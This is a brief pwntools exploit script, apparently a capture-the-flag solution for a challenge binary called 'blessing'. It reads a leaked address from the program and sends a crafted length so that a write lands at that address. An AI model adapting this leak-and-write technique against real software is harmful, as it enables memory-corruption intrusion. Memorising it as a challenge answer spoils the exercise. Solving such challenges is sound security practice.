from pwn import *

io = process("./blessing")

io.recvuntil(b"accept this: ")
leak = int(io.recv(14), 16)

# Send length = leak + 1 to land the write at the leak address
io.sendlineafter(b"length:", str(leak + 1).encode())
io.sendafter(b"song:", b"0")  # content doesn't matter

print(io.recvall())
